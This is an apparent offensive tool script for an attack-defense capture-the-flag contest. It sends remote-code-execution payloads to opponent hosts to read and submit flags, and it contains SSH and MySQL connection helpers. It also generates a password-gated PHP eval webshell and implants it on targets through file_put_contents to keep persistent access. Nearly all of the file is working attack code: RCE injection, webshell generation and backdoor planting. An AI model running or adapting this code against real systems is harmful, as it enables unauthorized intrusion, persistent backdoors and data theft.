#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@project    : customGr1m
@file       : Attack.py
@Author     : Gr%1m
@Date       : 14/11/2023 10:56 am
"""
from Configs.frame_config import FRAME_DIR
from urllib.parse import urlparse as URL
import requests, pymysql, paramiko, base64
import hashlib
import os
import re

# About Flag
Flags = set()
FlagPath = '/flag'
FlagLen = 41
FlagRegular = r'flag{(\w|-){32}}'

# Payload INFO
RceReplaceStr = 'XXXRCEstr'
HostReplaceStr = 'XXXHostname'
Payloads = {
    f"http://POST@{HostReplaceStr}:80/awdtest/testback.php?submit=submit&bb={RceReplaceStr}",
}
WebRootDir = '/var/www/html'
LoginCookie = 'security=low; PHPSESSID=e16f5c982733368120234560b9cb5625'

# Backdoor INFO
ErgodicDirReplace = "WEB_ROOT_REPLACE"
BDNameReplace = "HM_NAME_REPLACE"
BDDataReplace = "WAIT_FOR_REPLACE"

BDFileName = 'a10uN7yA_1'
BDcmdPass = 'x2aom1ng_20231114'
BDRceParam = 'kAt3l1na'
MemShell = f"http://POST@{HostReplaceStr}:80/{BDFileName}?cmd={BDcmdPass}&{BDRceParam}={RceReplaceStr}"
# todo: attack

# Enemy INFO
X = 'x'


def up_payloads(data):
    Payloads.add(data)


def submit_flag(submitAPI, token, flag):
    try:
        if submitAPI[-1] == 'GET':
            url = f'{submitAPI[0]}?{submitAPI[1]}={token}&{submitAPI[2]}={flag}'
            res = requests.get(url=url)
        elif submitAPI[-1] == 'POST':
            res = requests.post(url=submitAPI[0], data={submitAPI[1]: token, submitAPI[2]: flag})
        else:
            print("please set SubmitAPI method")
            return "No", 400
        return res.text, res.status_code
    except KeyboardInterrupt:
        print('Interrupt Submit Flag')
        return 0, 0
    except Exception:
        return 0, 0


def attack_vul(hostname, payload, cmd):
    purl = URL(payload)
    method, payload = purl.hostname, payload.split(f'@{HostReplaceStr}')[-1]
    payload = payload.replace(RceReplaceStr, cmd)
    url = f'http://{hostname}{payload}'
    try:
        if method == 'GET':
            res = requests.get(url=url, headers={'Cookie': LoginCookie})
        else:
            params = payload.split('?', maxsplit=1)[-1]
            data = {_.split('=', maxsplit=1)[0]: _.split('=', maxsplit=1)[1] for _ in params.split('&')}
            res = requests.post(url, data=data, headers={'Cookie': LoginCookie})
    except:
        res = None

    return res, purl


def get_flag(ey_hosts, rce="system('cat /flag');"):
    def extract_flag(text):
        try:
            flag = re.search(FlagRegular, text).group()
        except AttributeError:
            return None
        else:
            return flag.strip()

    for ey in ey_hosts:
        if ey_hosts[ey] == 'Infected':
            # todo : attack by mem shell
            res, _ = attack_vul(ey, MemShell, rce)
            Flags.add(extract_flag(res.text))

        for payload in Payloads:
            res, _ = attack_vul(ey, payload, rce)
            flag = extract_flag(res.text)
            if flag:
                Flags.add(flag)

    Flags.remove(None)


def generate_muma():
    bdp_md5 = hashlib.md5(BDcmdPass.encode()).hexdigest()
    LeftBraces = '{'
    RightBraces = '}'
    xiaoma_file = f"<?php if(md5($_GET['cmd'])=='{bdp_md5}'){LeftBraces}@eval($_POST['{BDRceParam}']);{RightBraces}?>"
    return base64.b64encode(xiaoma_file.encode())


# Implant Trojan
def backdoor_in(ey_hosts):
    with open(f'{FRAME_DIR}/data/memshell.php', 'rb') as f:
        memshell = f.read()

    memshell = memshell.replace(BDNameReplace.encode(), BDFileName.encode())
    memshell = memshell.replace(BDDataReplace.encode(), generate_muma())
    ergodic = base64.b64encode(memshell)
    door_puts = f"file_put_contents('ergodic.php',base64_decode({ergodic}));"
    for ey in ey_hosts:
        for payload in Payloads:
            res, purl = attack_vul(ey, payload, door_puts)
            try:
                trigger = requests.get(f'http://{ey}{os.path.dirname(purl.path)}/ergodic.php', timeout=(1, 0.01))
            except requests.exceptions.Timeout:
                trigger = 'timeout'

            if trigger == 'timeout' or trigger.status_code == 200:
                print(f'{ey} Successfully Infected')
                ey_hosts[ey] = 'Infected'


def connect_ssh(eyhostsshurl):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    eyhostssh = URL(eyhostsshurl)

    try:
        client.connect(hostname=eyhostssh.hostname,
                       username=eyhostssh.username,
                       password=eyhostssh.password,
                       port=eyhostssh.port, )
        print(f"[+] connect Host {eyhostssh.hostname}")

        _, stdout, stderr = client.exec_command('pwd')

    except paramiko.ssh_exception.NoValidConnectionsError as e:
        print(f'[-] SSH Error: {e}')
    except FileNotFoundError as e:
        print(f'[-] FileNotFoundError: {e}, {stderr.read().decode()}')
    finally:
        client.close()
        return 0


def connect_sql(eyhostsql):
    try:
        conn = pymysql.connect(
            host=eyhostsql.split('@')[1].split(':')[0],
            port=int(eyhostsql.split(':')[-1].split('/')[0]),
            user=eyhostsql.split(':')[1][2:],
            password=eyhostsql.split(':')[2].split('@')[0],
            database='dvwa',
            charset='utf8'  # 字符集，注意不是'utf-8'
        )
    except pymysql.OperationalError as e:
        print(f"[-] {e.__class__.__name__} {e}")
    else:
        return conn
